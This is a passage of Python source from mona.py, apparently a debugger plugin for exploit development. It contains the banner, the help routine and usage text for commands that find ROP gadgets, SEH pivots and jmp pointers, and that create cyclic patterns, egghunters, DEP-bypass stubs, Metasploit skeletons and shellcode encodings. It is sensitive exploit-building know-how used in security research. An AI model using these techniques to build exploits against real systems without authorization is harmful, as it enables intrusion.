     __  __   ___   _   _     _       ____   __   __
    |  \/  | / _ \ | \ | |   / \     |  _ \  \ \ / /
    | |\/| || | | ||  \| |  / _ \    | |_) |  \ V / 
    | |  | || |_| || |\  | / ___ \   |  __/    | |  
    |_|  |_| \___/ |_| \_|/_/   \_\  |_|       |_|  

          exploit development swiss army knife
"""
	banners[6] = bannertext

	

	# pick random banner
	bannerlist = []
	for i in range (0, len(banners)):
		bannerlist.append(i)

	random.shuffle(bannerlist)
	return banners[bannerlist[0]]

# Show Help
def procHelp(args, helpForCommand=None):
	global commands
	global scriptname
	dbg.log("    mona.py - Exploit Development Swiss Army Knife")
	dbg.log("    Debugger        : %s (%sbit)" % (__DEBUGGERAPP__,str(arch)))
	dbg.log("    Plugin version  : %s r%s" % (__VERSION__,__REV__))
	dbg.log("    Python version  : %s" % (getPythonVersion()))
	if __DEBUGGERAPP__ == "WinDBG":
		pykdversion = dbg.getPyKDVersionNr()
		dbg.log("    PyKD version    : %s" % pykdversion)
		if g_keystoneLoaded:
			dbg.log("    keystone-engine : %s" % (keystone.__version__))
	dbg.log("    Written by Corelan - https://www.corelan.be")
	dbg.log("    Project page : https://github.com/corelan/mona3")
	dbg.logLines(getBanner(),highlight=1)

	if helpForCommand == None:
		dbg.log("Global options :", highlight=1)
		dbg.log("----------------", highlight=1)
		dbg.log("You can use one or more of the following global options on any command that will perform")
		dbg.log("a search in one or more modules, returning a list of pointers :")
		dbg.logLines("\n  Global options affecting selection of modules:\n", highlight=1)
		dbg.log("  -n                     : Skip modules that start with a null byte. If this is too broad, use")
		dbg.log("                           option -cp nonull instead")
		dbg.log("  -o                     : Ignore OS modules")
		dbg.log("  -m <module,module,...> : only query the given modules. Be sure what you are doing !")
		dbg.log("                           You can specify multiple modules (comma separated)")
		dbg.log("                           Tip : you can use -m *  to include all modules.")
		dbg.log("                           All other module criteria will be ignored")
		dbg.log("                           Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,")
		dbg.log("                           blah or *blah* = contains blah")
		dbg.log("  -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.")
		dbg.log("                           You can use one or more of the following criteria :")
		dbg.log("                           aslr,safeseh,rebase,nx,cfg,os")
		dbg.log("                           You can enable or disable a certain criterium by setting it to true or false")
		dbg.log("                           Example :  -cm aslr=true,safeseh=false")
		dbg.log("                           Suppose you want to search for p/p/r in aslr enabled modules, you could call")
		dbg.log("                           !mona seh -cm aslr")
		dbg.log("  -cmp <regex>           : Only include modules whose full path matches the given regex (case-insensitive)")
		dbg.log("                           Example : -cmp kernel32  -cmp \"C:\\\\Windows\"  -cmp \"\\.dll$\"")
		dbg.logLines("\n  Global options affecting addresses:\n", highlight=1)
		dbg.log("  -p <nr>                : Stop search after <nr> pointers.")
		dbg.log("  -cp <crit,crit,...>    : Apply some criteria to the pointers to return")
		dbg.log("                           Available options are :")
		dbg.log("                           unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,")
		dbg.log("                           numeric,alphanum,nonull,startswithnull,unicoderev")
		dbg.log("                           Note : Multiple criteria will be evaluated using 'AND', ")
		dbg.log("                                  except if you are looking for unicode + one crit")
		dbg.log("  -cpb '\\x00\\x01'      : Provide list with bad chars, applies to pointers")
		dbg.log("                           You can use .. to indicate a range of bytes (in between 2 bad chars)")
		dbg.log("  -x <access>            : Specify desired access level of the returning pointers. If not specified,")
		dbg.log("                           only executable pointers will be returned.")
		dbg.log("                           Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *")
		dbg.log("")
		dbg.logLines("\n  Other global options:\n", highlight=1)
		dbg.log("  -h                     : Show help / usage for the selected command ")
		dbg.log("  -debug                 : Enable debug routines in mona/windbglib.")
		dbg.log("                           Don't use this option unless you've been asked to do so")
		dbg.log("")
		dbg.log("  Interrupting mona execution:", highlight=1)
		dbg.log("")
		dbg.log("  You can interrupt a long-running search by creating a file 'stop'")
		dbg.log("  and placing it in the same folder as mona.py")
		dbg.log("  Next time mona intends to calculate an eta, it will interrupt the script instead")
		dbg.log("-" * 120)
	scriptname = get_script_name()
	launchcmd = "!" + scriptname		
	if __DEBUGGERAPP__ == "WinDBG":
		launchcmd = "!py " + scriptname

	if helpForCommand == None:
		# show all commands

		dbg.logLines("\n\nUsage :")
		dbg.logLines("-------\n")
		if __DEBUGGERAPP__ == "WinDBG":
			dbg.log("<b>!py %s &lt;command&gt; &lt;parameter&gt;</b>" % scriptname)
			dbg.logLines("\nAvailable commands and parameters for <b>%sbit</b> architecture:\n" % str(arch))
		else:
			dbg.log("!mona <command> <parameter>")
			dbg.logLines("\nAvailable commands and parameters for %sbit architecture:\n" % str(arch))

		items = sorted(commands.items(), key=itemgetter(0))
		for item in items:
			if arch in commands[item[0]].supportedarchs:
				if commands[item[0]].usage != "":
					commandpart = clickMnCommand(commands[item[0]].name)
					aliastxt = ""
					textlen = len(commands[item[0]].name)					
					if commands[item[0]].alias != "":
						aliastxt = " / " + clickMnCommand(commands[item[0]].alias)
						textlen += len(commands[item[0]].alias) + 3
					commandpart += aliastxt
					dbg.logLines("  %s | %s" % (commandpart + (" " * (20 - textlen)), commands[item[0]].description))
		dbg.log("")
		dbg.log("  If you would like to get help about a specific command,", highlight=True)
		dbg.log("  run the command with the -h option.", highlight=True)
		dbg.log("")
	else:
		# help for a specific command
		if not arch in helpForCommand.supportedarchs:
			dbg.log("")
			dbg.log(" *** Please note that this command is not supported on %sbit ***" % str(arch))
		dbg.log("")
		dbg.log("You've asked for help about the '%s' command.  Here is the requested information:" % helpForCommand.name)
		dbg.log("")
		dbg.log("Basic command:") 
		dbg.log("--------------")
		dbg.log("   %s %s" % (launchcmd,helpForCommand.name ))
		if helpForCommand.name != helpForCommand.alias:
			dbg.log("   %s %s" % (launchcmd,helpForCommand.alias ))
		dbg.log("")
		dbg.log("Usage:")
		dbg.log("------")
		dbg.logLines(helpForCommand.usage.replace("\t","  "))
		dbg.log("")
		dbg.log("")		
	return


# populate the commands dict
def populateCommands(args):
	global commands

	
	sehUsage = """Default module criteria : non safeseh, non aslr, non rebase
This function will retrieve all stackpivot pointers that will bring you back to nseh in a seh overwrite exploit

Optional argument: 

    -all : also search outside of loaded modules"""
	
	configUsage = """Change config of mona.py
Available options are : 
    -get   <parameter>
    -set   <parameter> <value>
    -add   <parameter> <value_to_add>
    -del   <parameter> <value_to_del>
    -clear <parameter>
	-list

If you run 'config' without options, it will show the list of options currently set.
	
Mona uses the following parameters:
  workingfolder
  excluded_modules
  author

The exclude_modules parameter takes a comma-separated list of module names. 
You can add items to the parameter using the -add option, and remove items using -del

"""
	
	jmpUsage = """Default module criteria : non aslr, non rebase 

Mandatory argument :  -r <reg>  where reg is a valid register"""
	
	ropfuncUsage = """Default module criteria : non aslr, non rebase, non os
Output will be written to ropfunc.txt"""
	
	modulesUsage = """Shows information about the loaded modules.
Check the global options above to filter modules as needed.

Optional arguments :

    -peborder <list>   : select which PEB LDR_DATA list to walk (default: load)
                           load   - InLoadOrderModuleList (DLL load order)
                           memory - InMemoryOrderModuleList
                           init   - InInitializationOrderModuleList (DllMain call order)
    -sort <spec>       : sort the output using a compound sort specifier.
                         Each key is optionally followed by a suffix:
                           Bool columns  (rebase,safeseh,aslr,cfg,nx,os):
                             '+' = has the flag (True first)
                             '-' = does not have the flag (False first)  [default]
                           Numeric columns (base,size):
                             '+' = low first (ascending)  [default]
                             '-' = high first (descending)
                         No suffix uses the column default (bool: does not have the flag first; numeric: low first).
                         Separator styles (combinable):
                           Commas:        -sort aslr-,safeseh- (comma acts as delimiter, MUST have no spaces, no suffix sets default direction for each key)
                           Concatenated:  -sort aslr-safeseh-   (+/- suffix acts as delimiter; every key MUST have a suffix)
                           Spaces:        -sort "aslr safeseh" (no suffix, default direction for each key)
                         Valid keys: %s
                         Examples:
                           -sort aslr-          : modules without ASLR first (default)
                           -sort aslr+          : modules with ASLR first
                           -sort aslr-,safeseh- : no-ASLR first, then no-SafeSEH first
                           -sort "aslr safeseh" : same, using default direction (no flag first) for each key
                           -sort base+          : ascending base address (low first)""" % ", ".join(MODULE_COLUMNS)
	
	moduleInfoUsage = """Show detailed information about a specific loaded module.

Mandatory argument (one of):

    -m <name>    : image name as shown in the modules table (e.g. kernel32.dll or kernel32)
    -a <address> : address within the module (hex, e.g. 0x77e40000)
                   You can use a register name as well"""

	ropUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -offset <value>             : define the maximum offset for RET instructions (integer, default : 40)
    -distance <value>           : define the minimum distance for stackpivots (integer, default : 8).
                                  If you want to specify a min and max distance, set the value to min,max
    -depth <value>              : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)
    -split                      : write gadgets to individual files, grouped by the module the gadget belongs to
    -fast                       : skip the 'non-interesting' gadgets
    -cfg                        : Identify valid CFG target gadgets and write them to a separate output file
                                  (this may slow down the overall process a bit)
    -end <instruction(s)>       : specify one or more instructions that will be used as chain end. 
                                  (Separate instructions with #). Default ending is RETN
    -f \"file1,file2,..filen\"    : use mona generated rop files as input instead of searching in memory
    -rva                        : use RVA's in rop chain
    -s <technique>              : only create a ROP chain for the selected technique (options: virtualalloc, virtualprotect)    
    -sort                       : sort the output in rop.txt (sort on pointer value)"""
	
	jopUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 8)"""	
	   
	   
	stackpivotUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)
    -distance <value> : define the minimum distance for stackpivots (integer, default : 8)
                        If you want to specify a min and max distance, set the value to min,max
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)"""	   
	   
	filecompareUsage="""Compares 2 or more files created by mona using the same output commands
Make sure to use files that are created with the same version of mona and 
contain the output of the same mona command.

Mandatory argument : -f \"file1,file2,...filen\"
Put all filenames between one set of double quotes, and separate files with comma's.
You can specify a foldername as well with -f, all files in the root of that folder will be part of the compare.
Output will be written to filecompare.txt and filecompare_not.txt (not matching pointers)
Optional parameters : 
    -contains \"INSTRUCTION\"  (will only list if instruction is found)
    -nostrict (will also list pointer is instructions don't match in all files)
    -range <number> : find overlapping ranges for all pointers + range. 
                      When using -range, the -contains and -nostrict options will be ignored
    -ptronly : only show matching pointers (slightly faster). Doesn't work when 'range' is used"""

	patcreateUsage="""Create a cyclic pattern of a given size. Output will be written to pattern.txt
in ascii, hex and unescape() javascript format

Mandatory argument : size (numberic value)

Optional arguments:
    -extended : extend the 3rd characterset (numbers) with punctuation marks etc
    -c1 <chars> : set the first charset to this string of characters
    -c2 <chars> : set the second charset to this string of characters
    -c3 <chars> : set the third charset to this string of characters"""
	
	patoffsetUsage="""Find the location of 4 bytes in a cyclic pattern

Mandatory argument : the 4 bytes to look for
Note :  you can also specify a register

Optional arguments:
    -extended : extend the 3rd characterset (numbers) with punctuation marks etc
    -c1 <chars> : set the first charset to this string of characters
    -c2 <chars> : set the second charset to this string of characters
    -c3 <chars> : set the third charset to this string of characters
Note : the charset must match the charset that was used to create the pattern !
"""

	findwildUsage = """Find instructions in memory, accepts wildcards.

By default, findwild searches through the entire memory space and considers executable pages.
If you only want to search in executable pages that are part of modules, use the -m * argument

Mandatory arguments :
        -s <instruction#instruction#instruction>  (separate instructions with #)

Optional arguments:
        -b <address> : base/bottom address of the search range
        -t <address> : top address of the search range
        -depth <nr>  : number of instructions to go deep (8 by default)
        -distance min=nr,max=nr : global range for numeric offsets 
           (default: 4 to 40 decimal)		

  Inside the instructions string, you can use the following wildcards :
        *        = any instruction
        r32      = any 32bit register
        r64      = any 64bit register
        -n or +n = any number in a range (uses the -distance min, unless you specified a specific range)
        -nx:y    = specify the minimum and maximum number for this range specifically
		(same applies to +nx:y)
		imm      = an immediate (number) in a range (uses the -distance values as well)
		immx:y   = allows you to specify the range for this immediate

  Examples:
        pop r32#*#xor eax,eax#*#pop esi#ret
        push rbp#*#jmp rax
        mov eax, [eax+n4:20]#*#inc r32
        add esp,imm0x100:0x200#pop r32#retn
        """


	findUsage= """Find a sequence of bytes in memory.

Mandatory argument : -s <pattern> : the sequence to search for. If you specified type 'file', then use -s to specify the file.
This file needs to be a file created with mona.py, containing pointers at the begin of each line.

Optional arguments:
    -type <type>    : Type of pattern to search for : bin,asc,ptr,instr,file
    -b <address> : base/bottom address of the search range
    -t <address> : top address of the search range
    -c : skip consecutive pointers but show length of the pattern instead
    -p2p : show pointers to pointers to the pattern (might take a while !)
           this setting equals setting -level to 1
    -level <number> : do recursive (p2p) searches, specify number of levels deep
                      if you want to look for pointers to pointers, set level to 1
    -offset <number> : subtract a value from a pointer at a certain level
    -offsetlevel <number> : level to subtract a value from a pointer
    -r <number> : if p2p is used, you can tell the find to also find close pointers by specifying -r with a value.
                  This value indicates the number of bytes to step backwards for each search
    -unicode : used in conjunction with search type asc, this will convert the search pattern to unicode first 
    -ptronly : Only show the pointers, skip showing info about the pointer (slightly faster)"""
	
	assembleUsage = """Convert instructions to opcode. Separate multiple instructions with #.

Mandatory argument : -s <instructions> : the sequence of instructions to assemble to opcode"""
	
	infoUsage = """Show information about a given address in the context of the loaded application

Mandatory argument : -a <address> : the address to query"""

	dumpUsage = """Dump the specified memory range to a file. Either the end address or the size of
buffer needs to be specified.

Mandatory arguments :
    -s <address> : start address
    -f <filename> : the name of the file where to write the bytes

Optional arguments:
    -n <size> : the number of bytes to copy (size of the buffer)
    -e <address> : the end address of the copy"""
	

	compareUsage = """Compare a file created by mona's bytearray/msfvenom/gdb/hex/xxd/hexdump/ollydbg with a copy in memory.

Mandatory argument :
    -f <filename> : full path to input file

Optional argument :
    -a <address> : the exact address of the bytes in memory (address or register). 
                   If you don't specify an address, I will try to locate the bytes in memory 
                   by looking at the first 8 bytes.
    -s : skip locations that belong to a module
    -unicode : perform unicode search. Note: input should *not* be unicode, it will be expanded automatically
    -t : input file type format. If no file type format is specified, I will try to guess the input file type format.
	 
    Available formats:
    'raw', 'hexdump', 'js-unicode', 'dword', 'xxd', 'byte-array', 'hexstring', 'hexdump-C', 'classic-hexdump', 'escaped-hexes', 'msfvenom-powershell', 'gdb', 'ollydbg', 'msfvenom-ruby', 'msfvenom-c', 'msfvenom-carray', 'msfvenom-python'"""

	offsetUsage = """Calculate the number of bytes between two addresses. 
In addition to plain addresses, you can also specify registers, modules, module!functionnames, etc.

Mandatory arguments :
    -a1 <address> : the first address/register
    -a2 <address> : the second address/register"""
	
	bpUsage = """Set a breakpoint at a given address.
Without -t, sets a software breakpoint (INT 3).
With -t, sets a hardware breakpoint (uses debug registers DR0-DR3 on Immunity, 'ba' on WinDBG).

Hardware breakpoints use smart alignment (size 4 if 4-byte aligned, 2 if 2-byte aligned, else 1).
Execute type always uses size 1. On x64 WinDBG, size 8 is used for 8-byte aligned addresses.
On Immunity, max 4 hardware breakpoints can be active (DR0-DR3).

Mandatory arguments :
    -a <address> : the address where to set the breakpoint
                   (absolute address / register / module / module!function / symbol / expression with offsets)

Optional arguments :
    -t <type> : type of hardware breakpoint. Can be READ (R), WRITE (W) or EXE (X).
                READ/R  : triggers on read, write, and execute (Access).
                WRITE/W : triggers on write only.
                EXE/X   : triggers on execute only.
                If omitted, a software breakpoint is set instead.
    -if <condition> : condition expression for the breakpoint.
                     WinDBG example: -if "eax==0"
                     Immunity example: -if "EAX==0" (evaluated via LogBpHook)
 WinDBG only:
	    -c "windbg cmd;windbg cmd" : windbg command(s) to execute when breakpoint gets hit
			The commands must be in between double quotes, and separated by semi-colons.
			If WinDBG truncates -c at the first ';', use '|' instead.
			Mona will convert '|' back to ';' before setting the breakpoint.
			
			If a command needs double quotes, please replace them with #, 
			and I will convert them back to double quotes when setting the breakpoint.
			
			Example: -c ".printf #-----Breakpoint hit at 0x%p\\n#,@$ip|u @$ip L 1|r|.echo -----|gc"					 
 """
	
	bfUsage = """Set a breakpoint on exported or imported function(s) of the selected modules. 

Mandatory argument :
    -t <type> : type of breakpoint action. Can be 'add', 'del' or 'list'

Optional arguments:
    -f <function type> : set to 'import' or 'export' to read IAT or EAT. Default : export
    -s <func,func,func> : specify function names. 
                          If you want a bp on all functions, set -s to *
	    WinDBG only:
	    -c "windbg cmd;windbg cmd" : windbg command(s) to execute when breakpoint gets hit
			The commands must be in between double quotes, and separated by semi-colons.
			If WinDBG truncates -c at the first ';', use '|' instead.
			Mona will convert '|' back to ';' before setting the breakpoint.
			
			If a command needs double quotes, please replace them with #, 
			and I will convert them back to double quotes when setting the breakpoint.
			
			Example: -c ".printf #-----Breakpoint hit at 0x%p\\n#,@$ip|u @$ip L 1|r|.echo -----|gc"
	"""	
	
	findmspUsage = """Finds begin of a cyclic pattern in memory, looks if one of the registers contains (is overwritten) with a cyclic pattern
or points into a cyclic pattern. findmsp will also look if a SEH record is overwritten and finally, 
it will look for cyclic patterns on the stack, and pointers to cyclic pattern on the stack.

Optional argument :
    -distance <value> : distance from ESP, applies to search on the stack. Default : search entire stack
Note : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use"""

	suggestUsage = """Suggests an exploit buffer structure based on pointers to a cyclic pattern
Note : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use

Mandatory argument in case you are using WinDBG:
    -t <type:arg> : skeletontype. Valid types are :
                tcpclient:port, udpclient:port, fileformat:extension
                Examples : -t tcpclient:21
                           -t fileformat:pdf"""
	
	bytearrayUsage = """Creates a byte array, can be used to find bad characters

Optional arguments:
    -cpb <bytes> : bytes to exclude from the array. Example : '\\x00\\x0a\\x0d'
                   Note: you can specify wildcards using .. 
                   Example: '\\x00\\x0a..\\x20\\x32\\x7f..\\xff'
    -s : optional starting hex, example: '\\x7f'
    -e : optional ending hex, example: '\\xff'
         Example: -s \\x01 -e \\x7f to have all bytes from 0x01 to 0x7f
                  -s \\xff -e \\x7f to have all bytes from 0xff to 0x7f in reverse
    -r : show array backwards (reversed), starting at \\xff
    Output will be written to bytearray.txt (raw bytes + Python 2/3 code),
    and binary output will be written to bytearray.bin"""
	
	headerUsage = """Convert contents of a binary file to code that can be run to produce the file

Mandatory argument :
    -f <filename> : source filename

Optional argument:
    -t <type>     : specify type of output. Valid choices are 'python' (default) or 'ruby' """
	
	updateUsage = """Update mona to the latest version
	Optional argument:
	     -simul    	  : Check for updates and simulate updating. Will show release notes if available.	
	     -force    	  : Always overwrite local file(s) with downloaded copy if version/revision info is present.
		"""
	getpcUsage = """Find getpc routine for specific register

Mandatory argument :
    -r : register (ex: eax)"""

	eggUsage = """Creates an egghunter routine

Optional arguments:
    -t : tag (ex: w00t). Default value is w00t
    -c : enable checksum routine. Only works in conjunction with parameter -f
    -f <filename> : file containing the shellcode
    -startreg <reg> : start searching at the address pointed by this reg
    -wow64 : generate wow64 egghunter (Win7 and Win11/10). Default is traditional 32bit egghunter
    -winver <ver> : indicate Windows version for wow64 egghunter. Default is Windows 11/10. 
                    valid values are 7, 10 and 11.	
DEP Bypass options :
    -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"
    -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. 
                    By default this register is set to ESI
    -depsize <value> : sets the size for the dep bypass routine
    -depdest <reg> : this register points to the location of the egghunter itself.  
                     When bypassing DEP, the egghunter is already marked as executable. 
                     So when using the copy or copy_size methods, the DEP bypass in the egghunter 
                     would do a "copy 2 self".  In order to be able to do so, it needs a register 
                     where it can copy the shellcode to. 
                     If you leave this empty, the code will contain a GetPC routine."""
	
	stacksUsage = """Shows all stacks for each thread in the running application"""

	proclayoutUsage = """Show a unified process memory layout map (PEB, TEB, modules, stacks, heaps)

Optional arguments:
    -a         : Show all region types (including chunks and VA blocks)
    -s <mode>  : Sort/layout mode. Valid values:
                   base    (default) Flat list sorted by address; heap nesting is
                                     inferred from category order (getAllSorted).
                   elements          Hierarchical layout; indentation reflects explicit
                                     parent/child relationships — TEB→Stack,
                                     Heap→Segment→Chunk (getSortedByElement).
                 Example: -s elements
    -f <types> : Filter by comma-separated types to display
                 Valid types: peb, teb, mod, stack, heap, chunks, vablocks, all
				 (no -f provided: chunks & vablocks are hidden)
                 Each type expands to include related regions:
                   heap     = Heap + Heap Segments
                   chunks   = Heap + Heap Segments + Heap Chunks
                   vablocks = Heap + Heap Segments + Heap VA Blocks
                   all      = Everything
                 Example: -f "heap,stack"
                 Example: -f "chunks"  (shows heaps, segments and chunks)
                 Example: -f "all"     (same as -a)
    -t <type>  : Add individual types to the default output
                 Example: -t vablocks
				 (this is the equivalent of -f "peb,teb,mod,stack,heap,vablocks")

Use -a to show everything, -f to pick specific types, or -s elements for hierarchical mode."""
	
	skeletonUsage = """Creates a Metasploit exploit module skeleton for a specific type of exploit

Mandatory argument in case you are using WinDBG:
    -t <type:arg> : skeletontype. Valid types are :
                tcpclient:port, udpclient:port, fileformat:extension
                Examples : -t tcpclient:21
                           -t fileformat:pdf

Optional arguments:
    -s : size of the cyclic pattern (default : 5000)
"""
	
	heapUsage = """Show information about various heap chunk lists

Mandatory arguments :
    -h <address> : base address of the heap to query
    -t <type> : where type is 'segments', 'chunks', 'layout',
                'fea' (let mona determine the frontend allocator),
                'lal' (force display of LAL FEA, only on XP/2003),
                'lfh' (force display of LFH FEA (Vista/Win7/...)),
                'bea' (backend allocator, mona will automatically determine what it is),
                'all' (show all information)
    Note: 'layout' will show all heap chunks and their vtables & strings. Use on WinDBG for maximum results.

Optional arguments:
    -expand : Works only in combination with 'layout', will include VA/LFH/... chunks in the search.
              VA/LFH chunks may be very big, so this might slow down the search.
    -stat : show statistics (also works in combination with -h heap, -t segments or -t chunks
    -size <nr> : only show strings of at least the specified size. Works in combination with 'layout'
    -after <data> : only show current & next chunk layout entries when an entry contains this data
                    (Only works in combination with 'layout')
    -v : show data / write verbose info to the Log window"""
	
	getiatUsage = """Show IAT entries from selected module(s)

Optional arguments:
    -s <keywords> : only show IAT entries that contain one of these keywords"""

	geteatUsage = """Show EAT entries from selected module(s)

Optional arguments:
    -s <keywords> : only show EAT entries that contain one of these keywords"""
	
	deferUsage = """Set a deferred breakpoint

Mandatory arguments :
    -a <target>,<target>,... 
    target can be an address, a modulename!functionname or module.dll+offset (hex value)
    Warning, modulename!functionname is case sensitive !
	""" 
	

	fillchunkUsage = """Fills a heap chunk, referenced by an address expression, with A's (or another character)

Mandatory arguments :
    -a <address> : reference to heap chunk to fill (address, register, offset from register, etc)

Optional arguments:
    -b <character or byte to use to fill up chunk>
    -s <size> : if the referenced chunk is not found, and a size is defined with -s,
                memory will be filled anyway, up to the specified size"""

	getpageACLUsage = """List all mapped pages and show the ACL associated with each page

Optional arguments: 
    -a <address> : only show page information around this address.
                   (Page before, current page and page after will be displayed)"""
	
	bpsehUsage = """Sets a breakpoint on all current SEH Handler function pointers"""

	kbUsage = """Manage knowledgebase data

Mandatory arguments:
    -<type> : type can be 'list', 'set' or 'del'
    To 'set' ( = add / update ) a KB entry, or 'del' an entry, 
    you will need to specify 2 additional arguments:
        -id <id> : the Knowledgebase ID
        -value <value> : the value to add/update.  In case of lists, use a comma to separate entries.
    The -list parameter will show all current ID's
    To see the contents of a specific ID, use the -id <id> parameter."""

	macroUsage = """Manage macros for WinDBG
Arguments:
    -run <macroname> : run the commands defined in the specified macro
    -show <macroname> : show all commands defined in the specified macro
    -add <macroname> : create a new macro
    -set <macroname> -index <nr> -cmd <windbg command(s)> : edit a macro
               If you set the -command value to #, the command at the specified index
               will be removed.  If you have specified an existing index, the command 
               at that position will be replaced, unless you've also specified the -insert parameter.
               If you have not specified an index, the command will be appended to he list.
    -set <macroname> -file <filename> : will tell this macro to execute all instructions in the
               specified file. You can only enter one file per macro.
    -del <macroname> -iamsure: remove the specified macro. Use with care, I won't ask if you're sure."""

	sehchainUsage = """Displays the SEH chain for the current thread.
This command will also attempt to display offsets and suggest a payload structure
in case a cyclic pattern was used to overwrite the chain."""

	heapCookieUsage = """Will attempt to find reliable writeable pointers that can help avoiding
a heap cookie check during an arbitrary free on Windows XP"""

	hidedebugUsage = """Will attempt to hide the debugger from the process"""
	gflagsUsage = """Will show the currently set GFlags, based on the PEB.NtGlobalFlag value"""
	fwptrUsage = """Search for calls to pointers in a writeable location, 
will assist with finding a good target for 4byte arbitrary writes

Optional arguments:
    -bp : Set breakpoints on all found CALL instructions
    -patch : Patch the target of each CALL with 0x41414141
    -chunksize <nr> : only list the pointer if location-8 bytes contains a size value larger than <nr>
                      (size in blocks, not bytes)
    -offset <nr> : add <nr> bytes of offset within chunk, after flink/blink pointer 
                  (use in combination with -freelist and -chunksize <nr>)
    -freelist : Search for fwptr that are preceeded by 2 readable pointers that can act as flink/blink"""

	allocmemUsage = """Allocate RWX memory in the debugged process.

Optional arguments:
    -s <size>    : desired size of allocated chunk. VirtualAlloc will allocate at least 0x1000 bytes,
                   but this size argument is only useful when used in combination with -fill.
    -a <address> : desired target location for allocation, set to start of chunk to allocate.
    -acl <level> : overrule default RWX memory protection.
    -fill        : fill 'size' bytes (-s) of memory at specified address (-a) with A's.
    -force       : use in combination with -fill, in case page was already mapped but you still want to
                   fill the chunk at the desired location.
    -b <byte>    : Specify what byte to write to the desired location. Defaults to '\\x41'    
"""  

	changeaclUsage = """Change the ACL of a given page.
Arguments:
    -a <address>   : Address belonging to the page that needs to be changed
	-acl <level>   : New ACL. Valid values include N,R,RW,W,X,RX,RWX/RXW,XW,GUARD,NOCACHE,WC
					 You can also use full names such as PAGE_READWRITE, PAGE_EXECUTE_READ, etc.""" 

	infodumpUsage = """Dumps contents of memory to file. Contents will include all pages that don't
belong to stack, heap or loaded modules.
Output will be written to infodump.xml"""

	pebUsage = """Show the address of the Process Environment Block (PEB)"""

	tebUsage = """Show the address of the Thread Environment Block (TEB) for the current thread"""

	jsehUsage = """(look for jmp/call dword ptr[ebp/esp+nn and ebp-nn] + add esp,8+ret) 
Only addresses outside address range of modules will be listed unless parameter '-all' is given. 
In that case, all addresses will be listed. TRY THIS ONE !"""
	
	
	encUsage = """Encode a series of bytes
Arguments:
	    -t <type>         : Type of encoder to use.  Allowed value(s) are alphanum 
	    -s <bytes|asm>    : Bytes to encode (e.g. \\x41\\x42, 4142) or assembly (use # to separate instructions)
	    -f <path to file> : The full path to the binary file that contains the bytes to encode"""
	
	stringUsage = """Read a string from memory or write a string to memory
Arguments:
    -r                : Read a string, use in combination with -a
    -w                : Write a string, use in combination with -a and -s
    -noterminate      : Do not terminate the string (using in combination with -w)
    -u                : use UTF-16 (Unicode) mode
    -s <string>       : The string to write
    -a <address>      : The location to read from or write to"""

	unicodealignUsage = """Generates a venetian shellcode alignment stub which can be placed directly before unicode shellcode.

Arguments:
    -a <address>      : Specify the address where the alignment code will start/be placed
                      : If -a is not specified, the current value in EIP will be used.
    -l                : Prepend alignment with a null byte compensating nop equivalent
                        (Use this if the last instruction before the alignment routine 'leaks' a null byte)
    -b <reg>          : Set the bufferregister, defaults to eax
    -t <seconds>      : Time in seconds to run heuristics (defaults to 15)
    -ebp <value>      : Overrule the use of the 'current' value of ebp, 
                        ebp/address will be used to calculate offset to shellcode"""

	copyUsage = """Copies bytes from one location to another.

Arguments:
    -src <address>    : The source address
    -dst <address>    : The destination address
    -n <number>       : The number of bytes to copy""" 

	writeUsage = """Write a byte sequence to a memory location.

Arguments:
    -a <address>      : the destination address
    -s <bytes|asm>    : bytes to write"""


	dumpobjUsage = """Dump the contents of an object.

Arguments:
    -a <address>      : Address of object
    -s <number>       : Size of object (default value: 0x28 or size of chunk)

Optional arguments:
    -l <number>       : Recursively dump objects
    -m <number>       : Size for recursive objects (default value: 0x28)
"""

	dumplogUsage = """Dump all objects recorded in an alloc/free log
Note: dumplog will only dump objects that have not been freed in the same logfile.
Expected syntax for log entries:
    Alloc : 'alloc(size in hex) = address'
    Free  : 'free(address)'
Additional text after the alloc & free info is fine.
Just make sure the syntax matches exactly with the examples above.
Arguments:
    -f <path/to/logfile> : Full path to the logfile

Optional arguments:
    -l <number>       : Recursively dump objects
    -m <number>       : Size for recursive objects (default value: 0x28)
    -s <number>       : Only take allocated chunks of this exact size into consideration
    -nofree           : Ignore all free() events, show all allocations (including those that were freed)""" 

	tobpUsage = """Generate WinDBG syntax to set a logging breakpoint at a given location
Arguments:
    -a <address>      : Location (address, register) for logging breakpoint

Optional arguments:
    -e                : Execute breakpoint command right away"""

	symUsage = """Manage symbols: list status, fetch from server, or clean cache.

Arguments:
    -list (-l)   :  Show symbol availability for all modules
    -fetch (-f)  :  Download missing symbols from symbol server
    -clean (-c)  :  Remove .error files from symbol cache folders

Optional arguments (for -list):
    -m <filter>  :  Filter by module name (supports wildcards)
    -cm <spec>   :  Filter by module criteria (e.g. aslr=true,os=false)
    -o           :  Exclude OS modules
    -sort <spec> :  Sort output (%s)
                    e.g. -sort base+   (ascending base address)

Optional arguments (for -fetch):
    -m <filter>  :  Filter by module name (supports wildcards)
    -cm <spec>   :  Filter by module criteria (e.g. aslr=true,os=false)
    -o           :  Exclude OS modules
    -s <index>   :  Use only server #N from sympath table (see -list)
                    Without -s, tries all configured servers
    -force       :  Download symbols via direct HTTP instead of .reload /f
                    If .reload /f fails, falls back to direct HTTP download

Optional arguments (for -clean):
    -p <path/folder>   :  Remove .error files from this specific folder
                          (default: scan all symbol cache directories)

NOTE: -clean will delete files automatically, without asking for confirmation.
	""" % ", ".join(MODULE_COLUMNS)

	evalUsage = """Evaluates an expression
Arguments:
    <the expression to evaluate>

Accepted syntax includes: 
    hex values, decimal values (prefixed with 0n), registers, 
    module names, 'heap' ( = address of default process heap),
    module!functionname
    simple math operations"""

	diffheapUsage = """Compare current heap layout with previously saved state
Arguments:
    -save     : save current state to disk 
    -diff     : compare current state with previously saved state""" 

	loadUsage = """Read the contents from a file and write to a memory location
